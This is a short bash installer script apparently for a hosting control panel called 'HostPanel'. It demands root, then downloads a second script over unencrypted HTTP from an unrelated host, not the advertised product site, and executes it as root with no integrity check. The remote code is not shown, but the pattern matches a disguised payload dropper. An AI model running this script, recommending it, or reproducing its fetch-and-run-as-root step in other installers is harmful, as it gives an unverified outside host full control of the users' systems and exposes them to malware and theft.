#!/bin/bash
RED='\033[0;31m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
err() { echo -e "${RED}✗ ERROR:${NC} $1"; exit 1; }

[ "$EUID" -ne 0 ] && err "Please run as root: sudo bash install.sh"

echo ""
echo -e "${BOLD}  HostPanel — Modern Hosting Control Panel${NC}"
echo -e "  ${CYAN}https://host-panel.online${NC}"
echo ""

curl -sSL http://iptvrestream.online:88/install/install.sh > /tmp/hostpanel-install.sh || err "Failed to download."
chmod +x /tmp/hostpanel-install.sh
bash /tmp/hostpanel-install.sh
